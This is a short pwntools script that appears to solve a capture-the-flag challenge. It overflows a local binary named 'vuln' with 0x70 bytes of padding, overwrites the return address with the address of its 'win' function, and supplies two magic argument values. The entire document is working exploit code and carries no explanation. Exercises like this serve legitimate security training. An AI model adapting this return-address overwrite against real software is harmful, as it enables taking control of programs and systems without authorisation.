from pwn import *

target = ELF('./vuln')

r = process('./vuln')

payload = ''
payload += 'A' * 0x70
payload += p32(target.symbols['win'])
payload += 'A' * 4
payload += p32(0xdeadbeef)
payload += p32(0xdeadc0de)

r.sendlineafter('Please enter your string: \n', payload)

r.recvline()

print(r.recvall())
